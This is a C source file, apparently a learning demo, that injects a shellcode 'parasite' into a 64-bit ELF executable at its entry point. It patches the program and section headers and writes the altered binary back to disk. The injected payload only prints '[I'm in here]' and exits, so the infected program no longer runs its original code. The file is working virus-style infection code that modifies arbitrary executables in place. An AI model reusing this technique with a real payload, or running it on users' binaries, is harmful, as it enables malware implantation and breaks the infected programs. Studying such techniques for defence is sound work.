/* reverse_text_infect.c 
 * parasite a shellcode to the host's entry point.
 * the shellcode do nothing but print a greeting in the terminal.
 * Usage: ./reverse_text_infect <host_file> 
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <errno.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdint.h>
#include <elf.h>
#include <fcntl.h>
#include <string.h>

static volatile inline void 
_write(int, char *, unsigned int)__attribute__((aligned(8), __always_inline__));

static volatile inline void
_write(int fd, char *buffer, unsigned int len)
{
    __asm__ volatile(
        /* write(1, "[I'm in here]\n", 14) */
        "mov %0, %%edi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%edx\n"
        "mov $1, %%rax\n"
        "syscall\n"
        
        /* exit(0) */
        "mov $0, %%edi\n"
        "mov $60, %%rax\n"
        "syscall\n"
        : 
        : "g"(fd), "g"(buffer), "g"(len)
    );
}

void parasite_greeting()
{
    char str[] = {'[', 'I', '\'', 'm', 
    ' ', 'i', 'n', ' ', 'h', 'e', 'r', 'e', ']','\n', '\0'};
    _write(1, str, 14);
    
    /*
    __asm__ volatile(
        "mov $0x401178, %%rax\n"
        "jmp *%%rax\n"
        :
        : 
    );
    */
}

uint8_t *create_shellcode(void (*fn)(),size_t len)
{
    int i;
    uint8_t *mem = malloc(len);
    uint8_t *ptr = (uint8_t *)fn;
    for(i = 0; i < len; i++) mem[i] = ptr[i];
    return mem;
}

uint64_t f1 = (uint64_t)parasite_greeting;
uint64_t f2 = (uint64_t)create_shellcode;

int main(int argc, char *argv[])
{
    if(argc < 2)
    {
        printf("Usage: %s <exec_file>\n", argv[0]);
        exit(-1);
    }
    size_t parasite_len = ((f2 - f1) + 7) & (~7);
    uint8_t *shellcode = create_shellcode(parasite_greeting, parasite_len);
    char *file_name = strdup(argv[1]);
    int fd;
    if((fd = open(file_name, O_RDWR)) < 0)
    {
        perror("open");
        exit(-1);
    }
    struct stat st;
    if(fstat(fd, &st) < 0)
    {
        perror("fstat");
        exit(-1);
    }
    uint8_t *mem = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
    if(mem == NULL)
    {
        perror("mmap");
        exit(-1);
    }
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
    Elf64_Phdr *phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
    Elf64_Shdr *shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
    Elf64_Off start_off;
    Elf64_Off text_off;
    size_t remained_text_len;
    Elf64_Addr new_origin_entry;
    /* this is for jump back to the original entry*/
    /* but here we just print a greeting message */
    /* so this variable is unused */
    
    int i;
    for(i = 0; i < ehdr->e_phnum; i++)
    {
        if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == PF_R + PF_X)
        {
            text_off = phdr[i].p_offset;
            size_t in_text_off = ehdr->e_entry - phdr[i].p_vaddr;
            start_off = in_text_off + phdr[i].p_offset;
            new_origin_entry = ehdr->e_entry + parasite_len;
            remained_text_len = phdr[i].p_filesz - in_text_off;
            phdr[i].p_memsz += parasite_len;
            phdr[i].p_filesz += parasite_len;
        }
    }
    int text_sect = 0;
    for(i = 0; i < ehdr->e_shnum; i++)
    {
        if(shdr[i].sh_flags == SHF_ALLOC + SHF_EXECINSTR && text_sect)
            shdr[i].sh_offset += parasite_len;
        if(shdr[i].sh_addr == ehdr->e_entry)
        {
            shdr[i].sh_size += parasite_len;
            text_sect = 1;
        }
    }
    if(lseek(fd, 0, SEEK_SET) < 0)
    {
        perror("lseek");
        exit(-1);
    }
    if(write(fd, mem, sizeof(Elf64_Ehdr) + ehdr->e_phentsize * ehdr->e_phnum) < 0)
    {
        perror("write");
        exit(-1);
    }
    if(lseek(fd, start_off, SEEK_SET) < 0)
    {
        perror("lseek");
        exit(-1);
    }
    if(write(fd, shellcode, parasite_len) < 0)
    {
        perror("write");
        exit(-1);
    }
    if(lseek(fd, start_off + parasite_len, SEEK_SET) < 0)
    {
        perror("lseek");
        exit(-1);
    }
    if(write(fd, &mem[start_off], remained_text_len) < 0)
    {
        perror("write");
        exit(-1);
    }
    if(lseek(fd, ehdr->e_shoff, SEEK_SET) < 0)
    {
        perror("lseek");
        exit(-1);
    }
    if(write(fd, shdr, ehdr->e_shentsize * ehdr->e_shnum) < 0)
    {
        perror("write");
        exit(-1);
    }
    close(fd);
}